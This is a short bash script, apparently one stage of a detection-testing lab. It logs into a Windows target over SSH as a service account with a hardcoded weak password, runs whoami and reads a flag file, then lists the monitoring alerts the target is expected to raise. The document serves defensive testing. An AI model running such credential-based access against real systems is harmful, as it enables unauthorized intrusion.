#!/usr/bin/env bash
# Stage 2 — initial access through a weak local account over SSH. The
# analog of the Linux redis foothold: inbound-only, almost silent to a
# host monitor aside from the logon event itself.
set -euo pipefail
. "$(dirname "$0")/lib.sh"

need ssh "openssh client"
command -v sshpass >/dev/null 2>&1 || need expect "macOS ships expect; linux: apt install sshpass"

say "logging in as svc_backup with the well-known password"
ssh_try svc_backup backup123 'whoami' ||
  die "SSH as svc_backup failed — OpenSSH up? password auth on?"
# Forward slashes: expect/Tcl treats \U in C:\Users as a unicode escape.
ssh_try svc_backup backup123 'type C:/Users/svc_backup/flag.txt'

note "expected on the target:"
note "  auth    INFO/LOW  logon 4624 (network) from $HOST_IP"
note "  process CRITICAL  flag-access — C:\\Users\\svc_backup\\flag.txt"
note "  process INFO      every exec above (log_all_process_events)"
